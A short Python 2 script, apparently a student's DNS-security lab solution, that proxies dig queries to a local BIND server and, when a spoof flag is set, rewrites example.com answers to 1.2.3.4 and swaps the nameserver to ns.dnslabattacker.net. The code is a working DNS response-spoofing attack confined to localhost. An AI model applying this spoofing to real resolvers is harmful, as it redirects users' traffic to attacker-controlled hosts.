#!/usr/bin/env python2
import argparse
import socket
from scapy.all import *

import sys

# This is going to Proxy in front of the Bind Server

parser = argparse.ArgumentParser()
parser.add_argument("--port", help="port to run your proxy on - careful to not run it on the same port as the BIND server", type=int)
parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int)
parser.add_argument("--spoof_response", action="store_true", help="flag to indicate whether you want to spoof the BIND Server's response (Part 3) or return it as is (Part 2). Set to True for Part 3 and False for Part 2", default=False)
args = parser.parse_args()

# Port to run the proxy on
port = args.port
# BIND's port
dns_port = args.dns_port
# Flag to indicate if the proxy should spoof responses
SPOOF = args.spoof_response

def proxy_DNS(query_socket, proxy_ip, BIND_ip):
    """
    accepts DNS queries from dig and forwards them to the BIND server
    receive a DNS reply from the BIND server and forward it back to dig (unmodified)
    """
    # accepts DNS queries from dig
    query_bytes, query_address = query_socket.recvfrom(1024)

    BIND_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # forwards them to the BIND server
    BIND_socket.sendto(query_bytes, (BIND_ip, dns_port))
    # receive a DNS reply from the BIND server
    reply_bytes, BIND_address = BIND_socket.recvfrom(1024)
    BIND_socket.close()

    if SPOOF:
        reply = DNS(reply_bytes)
        if reply[DNSQR].qname == "example.com.":
            # IPv4 address is 1.2.3.4
            reply[DNSRR].rdata = "1.2.3.4"
            # change its name servers to ns.dnslabattacker.net
            reply[DNS].ns.rdata = "ns.dnslabattacker.net"
            for i in range(1, reply[DNS].nscount):
                del reply[DNS].ns[i]
            reply[DNS].nscount = 1
        reply_bytes = bytes(reply)

    # forward it back to dig
    query_socket.sendto(reply_bytes, query_address)


if __name__ == '__main__':
    query_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    query_socket.bind(("127.0.0.1", port))  # proxy ip

    while True:
        try:
            proxy_DNS(query_socket, "127.0.0.1", "127.0.0.1")  # proxy_ip, BIND_ip
        except KeyboardInterrupt:
            query_socket.close()
            sys.exit(0)
